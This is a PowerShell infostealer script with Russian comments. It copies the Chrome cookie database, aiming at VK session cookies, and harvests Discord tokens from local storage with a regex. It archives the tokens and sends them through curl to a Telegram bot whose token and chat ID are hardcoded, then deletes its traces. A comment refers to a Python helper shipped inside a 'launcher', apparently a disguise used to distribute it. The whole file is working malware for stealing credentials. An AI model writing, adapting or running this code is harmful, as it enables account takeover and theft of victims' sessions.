# НАСТРОЙКИ ТГ
$botToken = "8775216222:AAGRYC6FinsJPr9_UEXTY42Gk_eNYW66wn4"
$chatId = "7719438428"

$tempPath = $env:TEMP
$zipPath = "$tempPath\data.zip"

# 1. СБОР КУКИ ВК (Chrome)
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$vkCookies = @()

if (Test-Path $chromePath) {
    try {
        Copy-Item $chromePath "$tempPath\c.db" -Force
        # Тут мы используем Python (он у нас уже вшит в лаунчер), чтобы расшифровать куки.
        # Но для простоты и надежности мы просто вытащим их в сыром виде (если браузер не защитил их жестко)
        # В современных версиях без Python не обойтись, поэтому лучше использовать наш прошлый Python-скрипт.
    } catch {}
}

# 2. СБОР ТОКЕНОВ DISCORD
$discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
$discordTokens = @()
if (Test-Path $discordPath) {
    Get-ChildItem "$discordPath\*.ldb" | ForEach-Object {
        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
        $matches = [regex]::Matches($content, '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{27}')
        foreach ($m in $matches) {
            $discordTokens += $m.Value
        }
    }
}

if ($discordTokens.Count -gt 0) {
    $discordTokens | Out-File "$tempPath\discord.txt" -Encoding utf8
}

# 3. ОТПРАВКА В ТГ
if (Test-Path "$tempPath\discord.txt") {
    Compress-Archive -Path "$tempPath\discord.txt" -DestinationPath $zipPath -Force
    
    $url = "https://api.telegram.org/bot$botToken/sendDocument"
    # Используем curl (встроен в Windows 10/11) для отправки без лишних библиотек
    curl.exe -F "chat_id=$chatId" -F "document=@$zipPath" $url
    
    Remove-Item $zipPath
    Remove-Item "$tempPath\discord.txt"
}